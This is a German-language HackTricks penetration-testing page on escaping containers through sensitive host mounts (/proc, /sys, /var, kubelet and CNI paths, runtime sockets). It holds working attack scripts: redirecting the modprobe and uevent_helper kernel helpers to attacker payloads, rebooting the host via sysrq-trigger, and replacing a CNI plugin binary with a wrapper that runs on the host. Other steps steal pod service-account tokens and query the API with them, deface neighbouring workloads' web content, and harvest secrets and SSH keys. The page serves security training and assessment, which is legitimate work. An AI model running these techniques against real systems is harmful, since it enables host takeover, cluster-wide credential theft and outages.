# Sensitive Host Mounts

{{#include ../../../banners/hacktricks-training.md}}

## Überblick

Host mounts sind eine der wichtigsten praktischen container-escape-Angriffsflächen, weil sie oft eine sorgfältig isolierte Prozesssicht wieder direkt auf die Sichtbarkeit von Host-Ressourcen zurückfallen lassen. Die gefährlichen Fälle sind nicht auf `/` beschränkt. Bind mounts von `/proc`, `/sys`, `/var`, Runtime-Sockets, von kubelet verwalteten Zuständen oder device-bezogenen Pfaden können Kernel-Kontrollen, Credentials, Filesystems benachbarter Container und Runtime-Management-Interfaces offengelegen.

Diese Seite existiert getrennt von den einzelnen Schutzseiten, weil das Missbrauchsmodell mehrere Bereiche betrifft. Ein schreibbarer Host-Mount ist teilweise wegen mount namespaces gefährlich, teilweise wegen user namespaces, teilweise wegen AppArmor- oder SELinux-Abdeckung und teilweise wegen des exakt exponierten Host-Pfads. Ihn als eigenes Thema zu behandeln macht die Angriffsfläche deutlich leichter nachvollziehbar.

## `/proc` Exposure

procfs enthält sowohl gewöhnliche Prozessinformationen als auch Kernel-Control-Interfaces mit hoher Auswirkung. Ein Bind-Mount wie `-v /proc:/host/proc` oder eine Container-Ansicht, die unerwartete schreibbare proc-Einträge offenlegt, kann daher zu Information Disclosure, denial of service oder direkter host code execution führen.

Hochwertige procfs-Pfade umfassen:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuse

Beginne damit zu prüfen, welche hochwertigen procfs-Einträge sichtbar oder schreibbar sind:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Diese Pfade sind aus unterschiedlichen Gründen interessant. `core_pattern`, `modprobe` und `binfmt_misc` können bei Schreibzugriff zu Host-Code-Execution-Pfaden werden. `kallsyms`, `kmsg`, `kcore` und `config.gz` sind starke Reconnaissance-Quellen für Kernel-Exploitation. `sched_debug` und `mountinfo` zeigen Prozess-, cgroup- und Filesystem-Kontext und können helfen, das Host-Layout von داخل des Containers aus zu rekonstruieren.

Der praktische Wert jedes Pfads ist unterschiedlich, und sie alle so zu behandeln, als hätten sie denselben Impact, erschwert die Triage:

- `/proc/sys/kernel/core_pattern`
Wenn schreibbar, ist dies einer der höchstwirksamen procfs-Pfade, weil der Kernel nach einem Crash einen Pipe-Handler ausführt. Ein Container, der `core_pattern` auf ein Payload zeigt, das in seinem Overlay oder in einem gemounteten Host-Pfad gespeichert ist, kann oft Host-Code-Execution erlangen. Siehe auch [read-only-paths.md](protections/read-only-paths.md) für ein dediziertes Beispiel.
- `/proc/sys/kernel/modprobe`
Dieser Pfad steuert den Userspace-Helper, den der Kernel verwendet, wenn er Module-Loading-Logik aufrufen muss. Wenn er aus dem Container heraus schreibbar ist und im Host-Kontext interpretiert wird, kann er zu einem weiteren Host-Code-Execution-Primitive werden. Besonders interessant ist er in Kombination mit einer Möglichkeit, den Helper-Pfad auszulösen.
- `/proc/sys/vm/panic_on_oom`
Dies ist normalerweise kein sauberes Escape-Primitive, kann aber Speicherdruck in hostweites Denial of Service umwandeln, indem OOM-Bedingungen in Kernel-Panic-Verhalten überführt werden.
- `/proc/sys/fs/binfmt_misc`
Wenn die Registrierungsoberfläche schreibbar ist, kann der Angreifer einen Handler für einen gewählten Magic-Wert registrieren und bei Ausführung einer passenden Datei Code-Ausführung im Host-Kontext erhalten.
- `/proc/config.gz`
Nützlich für Kernel-Exploit-Triage. Es hilft festzustellen, welche Subsysteme, Mitigations und optionalen Kernel-Features aktiviert sind, ohne Host-Paketmetadaten zu benötigen.
- `/proc/sysrq-trigger`
Meist ein Denial-of-Service-Pfad, aber ein sehr ernstzunehmender. Er kann den Host sofort neu starten, panic auslösen oder anderweitig stören.
- `/proc/kmsg`
Zeigt Kernel-Ring-Buffer-Meldungen. Nützlich für Host-Fingerprinting, Crash-Analyse und in einigen Umgebungen zum leak von Informationen, die für Kernel-Exploitation hilfreich sind.
- `/proc/kallsyms`
Wertvoll, wenn lesbar, weil es exportierte Kernel-Symbolinformationen offenlegt und helfen kann, Annahmen zur Address Randomization während der Entwicklung von Kernel-Exploits zu umgehen.
- `/proc/[pid]/mem`
Dies ist eine direkte Prozessspeicher-Schnittstelle. Wenn der Zielprozess mit den erforderlichen ptrace-ähnlichen Bedingungen erreichbar ist, kann sie das Lesen oder Ändern des Speichers eines anderen Prozesses erlauben. Der reale Impact hängt stark von Berechtigungen, `hidepid`, Yama und ptrace-Restriktionen ab, daher ist dies ein starker, aber bedingter Pfad.
- `/proc/kcore`
Bietet eine core-image-artige Sicht auf den Systemspeicher. Die Datei ist riesig und unhandlich, aber wenn sie sinnvoll lesbar ist, deutet das auf eine schlecht geschützte Host-Speicheroberfläche hin.
- `/proc/kmem` and `/proc/mem`
Historisch hochwirksame Raw-Memory-Schnittstellen. Auf vielen modernen Systemen sind sie deaktiviert oder stark eingeschränkt, aber wenn sie vorhanden und nutzbar sind, sollten sie als kritische Findings behandelt werden.
- `/proc/sched_debug`
Leakt Scheduling- und Task-Informationen, die Host-Prozessidentitäten offenlegen können, selbst wenn andere Prozessansichten sauberer wirken als erwartet.
- `/proc/[pid]/mountinfo`
Extrem nützlich, um zu rekonstruieren, wo der Container wirklich auf dem Host lebt, welche Pfade overlay-basiert sind und ob ein schreibbarer Mount Host-Inhalt oder nur die Container-Schicht betrifft.

Wenn `/proc/[pid]/mountinfo` oder Overlay-Details lesbar sind, nutze sie, um den Host-Pfad des Container-Filesystems zu rekonstruieren:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Diese Befehle sind nützlich, weil mehrere Host-Execution-Tricks erfordern, einen Pfad innerhalb des Containers in den entsprechenden Pfad aus Sicht des Hosts umzuwandeln.

### Vollständiges Beispiel: `modprobe` Helper-Path-Abuse

Wenn `/proc/sys/kernel/modprobe` vom Container aus beschreibbar ist und der Helper-Pfad im Host-Kontext interpretiert wird, kann er auf eine vom Angreifer kontrollierte Payload umgeleitet werden:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
Der genaue Auslöser hängt vom Ziel und vom Kernel-Verhalten ab, aber der wichtige Punkt ist, dass ein beschreibbarer Helper-Pfad einen zukünftigen Kernel-Helper-Aufruf auf vom Angreifer kontrollierten Host-Pfad-Inhalt umleiten kann.

### Vollständiges Beispiel: Kernel-Recon mit `kallsyms`, `kmsg` und `config.gz`

Wenn das Ziel eine Einschätzung der Ausnutzbarkeit statt eines unmittelbaren Escape ist:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Diese Befehle helfen zu beantworten, ob nützliche Symbolinformationen sichtbar sind, ob aktuelle Kernel-Meldungen interessante Zustände preisgeben und welche Kernel-Features oder Mitigations eingebaut sind. Der Impact ist meist kein direkter Escape, aber er kann die Triage von Kernel-Vulnerabilities deutlich verkürzen.

### Full Example: SysRq Host Reboot

Wenn `/proc/sysrq-trigger` schreibbar ist und die Host-Ansicht erreicht:
```bash
echo b > /proc/sysrq-trigger
```
Die Auswirkung ist ein sofortiger Host-Neustart. Das ist kein subtiles Beispiel, aber es zeigt klar, dass procfs exposure viel schwerwiegender sein kann als information disclosure.

## `/sys` Exposure

sysfs legt große Mengen an Kernel- und Geräte-Status offen. Einige sysfs-Pfade sind hauptsächlich für Fingerprinting nützlich, während andere die Helper-Ausführung, das Geräteverhalten, die security-module-Konfiguration oder den Firmware-Status beeinflussen können.

Wichtige sysfs-Pfade sind:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Diese Pfade sind aus unterschiedlichen Gründen relevant. `/sys/class/thermal` kann das thermal-management-Verhalten beeinflussen und damit in schlecht abgesicherten Umgebungen die Host-Stabilität. `/sys/kernel/vmcoreinfo` kann Crash-Dump- und Kernel-Layout-Informationen leaken, was beim Low-Level-Host-Fingerprinting hilft. `/sys/kernel/security` ist die `securityfs`-Schnittstelle, die von Linux Security Modules verwendet wird, daher kann unerwarteter Zugriff dort MAC-bezogene Daten offenlegen oder verändern. EFI-Variablenpfade können firmware-gestützte Boot-Einstellungen beeinflussen und sind damit deutlich kritischer als gewöhnliche Konfigurationsdateien. `debugfs` unter `/sys/kernel/debug` ist besonders gefährlich, weil es absichtlich eine entwicklerorientierte Schnittstelle ist, mit deutlich geringeren Sicherheitsannahmen als gehärtete, produktionsseitige Kernel-APIs.

Nützliche Review-Commands für diese Pfade sind:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Was diese Befehle interessant macht:

- `/sys/kernel/security` kann offenlegen, ob AppArmor, SELinux oder eine andere LSM-Oberfläche auf eine Weise sichtbar ist, die eigentlich host-only hätte bleiben sollen.
- `/sys/kernel/debug` ist in dieser Gruppe oft der alarmierendste Fund. Wenn `debugfs` gemountet und lesbar oder schreibbar ist, ist mit einer breiten kernel-facing Oberfläche zu rechnen, deren genaues Risiko von den aktivierten Debug-Nodes abhängt.
- EFI variable exposure ist seltener, aber wenn sie vorhanden ist, ist sie hoch relevant, weil sie Firmware-gestützte Einstellungen und nicht gewöhnliche Runtime-Dateien betrifft.
- `/sys/class/thermal` ist hauptsächlich für Host-Stabilität und Hardware-Interaktion relevant, nicht für einen sauberen Shell-Style-escape.
- `/sys/kernel/vmcoreinfo` ist hauptsächlich eine Quelle für Host-Fingerprinting und Crash-Analyse und nützlich, um den Low-Level-Kernel-Status zu verstehen.

### Full Example: `uevent_helper`

Wenn `/sys/kernel/uevent_helper` schreibbar ist, kann der Kernel einen von Angreifern kontrollierten Helper ausführen, wenn ein `uevent` ausgelöst wird:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
Der Grund, warum das funktioniert, ist, dass der Helper-Pfad aus Sicht des Hosts interpretiert wird. Sobald er ausgelöst wird, läuft der Helper im Host-Kontext statt innerhalb des aktuellen Containers.

## `/var` Exposure

Das Mounten von `/var` des Hosts in einen Container wird oft unterschätzt, weil es nicht so dramatisch aussieht wie das Mounten von `/`. In der Praxis kann es ausreichen, um Runtime-Sockets, Container-Snapshot-Verzeichnisse, von kubelet verwaltete Pod-Volumes, projektierte Service-Account-Tokens und benachbarte Dateisysteme von Anwendungen zu erreichen. Auf modernen Nodes ist `/var` oft der Ort, an dem der operativ interessanteste Container-Zustand tatsächlich liegt.

### Kubernetes Example

Ein Pod mit `hostPath: /var` kann oft die projektieren Tokens anderer Pods und Overlay-Snapshot-Inhalte lesen:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Diese Befehle sind nützlich, weil sie beantworten, ob der Mount nur langweilige Anwendungsdaten oder hochsensible Cluster-Credentials offenlegt. Ein lesbares Service-Account-Token kann lokale Codeausführung sofort in Kubernetes-API-Zugriff verwandeln.

Wenn das Token vorhanden ist, prüfe, worauf es zugreifen kann, statt beim Auffinden des Tokens aufzuhören:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
Der Einfluss hier kann viel größer sein als lokaler Node-Zugriff. Ein Token mit breitem RBAC kann ein eingebundenes `/var` in einen Cluster-weiten Kompromiss verwandeln.

### Docker And containerd Example

Auf Docker-Hosts liegen die relevanten Daten oft unter `/var/lib/docker`, während sie auf containerd-basierten Kubernetes-Nodes unter `/var/lib/containerd` oder snapshotter-spezifischen Pfaden liegen können:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Wenn das eingebundene `/var` schreibbare Snapshot-Inhalte einer anderen Workload offenlegt, kann der Angreifer möglicherweise Anwendungsdateien verändern, Web-Inhalte platzieren oder Startskripte ändern, ohne die aktuelle Container-Konfiguration anzutasten.

Konkrete Missbrauchsideen, sobald schreibbare Snapshot-Inhalte gefunden wurden:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Diese Befehle sind nützlich, weil sie die drei wichtigsten Impact-Familien von gemountetem `/var` zeigen: application tampering, secret recovery und lateral movement in benachbarte workloads.

## Kubelet State, Plugins, And CNI Paths

Ein Mount von `/var/lib/kubelet`, `/opt/cni/bin` oder `/etc/cni/net.d` wird oft über privileged DaemonSets, CNI agents, CSI node plugins, GPU operators und storage helpers bereitgestellt. Diese Mounts werden leicht als "node plumbing" abgetan, aber sie liegen direkt im execution path für neue pods und enthalten oft kubelet credentials, projected secrets, registration sockets und ausführbare host-side plugin binaries.

High-value targets sind:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Nützliche review commands sind:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
Warum diese Pfade wichtig sind:

- `/var/lib/kubelet/pki` kann kubelet client certificates und andere node-local credentials offenlegen, die manchmal gegen den API server oder kubelet-facing TLS endpoints wiederverwendet werden können, abhängig vom cluster design.
- `/var/lib/kubelet/pods` enthält oft projected service-account tokens und gemountete Secrets für benachbarte pods auf demselben node.
- `/var/lib/kubelet/pod-resources/kubelet.sock` ist vor allem eine reconnaissance surface, aber eine sehr nützliche: Sie zeigt, welche pods und containers aktuell GPUs, hugepages, SR-IOV devices und andere scarce node-local resources besitzen.
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` und `/var/lib/kubelet/plugins_registry` zeigen, welche CSI, DRA und device plugins installiert sind und mit welchen sockets der kubelet voraussichtlich sprechen wird. Wenn diese Verzeichnisse beschreibbar statt nur lesbar sind, wird der Befund deutlich schwerwiegender.
- `/opt/cni/bin` und `/etc/cni/net.d` liegen direkt auf dem pod-network setup path. Schreibzugriff dort ist oft ein verzögerter host-execution primitive statt nur configuration exposure.

### Full Example: Beschreibbares `/opt/cni/bin`

Wenn ein host CNI binary directory read-write gemountet ist, kann das Ersetzen eines plugins ausreichen, um beim nächsten Mal host execution zu erhalten, wenn der kubelet auf diesem node ein pod sandbox erstellt:
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > /tmp/cni-triggered
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
```
Dies ist nicht so unmittelbar wie ein gemounteter `docker.sock`, aber es ist oft realistischer in kompromittierten Kubernetes-Infrastruktur-Pods. Der wichtige Punkt ist, dass das modifizierte Binary später vom Host-Network-Setup-Flow ausgeführt wird, nicht vom aktuellen Container.


## Runtime Sockets

Sensitive host mounts umfassen oft Runtime-Sockets statt kompletter Verzeichnisse. Diese sind so wichtig, dass sie hier eine explizite Wiederholung verdienen:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Siehe [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) für vollständige Exploitation-Flows, sobald einer dieser sockets gemountet ist.

Als schnelles erstes Interaktionsmuster:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Wenn einer dieser Schritte erfolgreich ist, ist der Weg von "mounted socket" zu "start a more privileged sibling container" normalerweise viel kürzer als jeder kernel breakout path.

## Mount-Related CVEs

Host mounts überschneiden sich auch mit runtime vulnerabilities. Wichtige aktuelle Beispiele sind:

- `CVE-2024-21626` in `runc`, where ein leaked directory file descriptor das working directory auf dem host filesystem platzieren konnte.
- `CVE-2024-23651`, `CVE-2024-23652`, und `CVE-2024-23653` in BuildKit, where malicious Dockerfiles, frontends, und `RUN --mount` flows host file access, deletion, oder elevated privileges während builds wieder einführen konnten.
- `CVE-2024-1753` in Buildah und Podman build flows, where crafted bind mounts während build `/` read-write offenlegen konnten.
- `CVE-2025-47290` in `containerd` 2.1.0, where ein TOCTOU während image unpack es einer speziell präparierten image erlauben konnte, das host filesystem während pull zu modifizieren.

Diese CVEs sind hier wichtig, weil sie zeigen, dass mount handling nicht nur eine Frage der operator configuration ist. Das runtime selbst kann ebenfalls mount-driven escape conditions einführen.

## Checks

Verwende diese Befehle, um die Mount exposures mit dem höchsten Wert schnell zu finden:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Was hier interessant ist:

- Host root, `/proc`, `/sys`, `/var` und runtime sockets sind alles hochpriorisierte Findings.
- Schreibbare proc/sys-Einträge bedeuten oft, dass der mount host-globale Kernel-Kontrollen exponiert statt einer sicheren Container-Ansicht.
- Gemountete `/var`-Pfade verdienen eine Prüfung auf Credentials und benachbarte Workloads, nicht nur eine Dateisystemprüfung.
- Kubelet-State-Verzeichnisse und CNI/plugin-Pfade verdienen die gleiche Priorität wie runtime sockets, weil sie oft direkt auf dem Pod-Erstellungs- und Credential-Verteilungs-Pfad des Nodes liegen.

## References

- [Local Files And Paths Used By The Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [cilium-agent container can access the host via `hostPath` mount](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
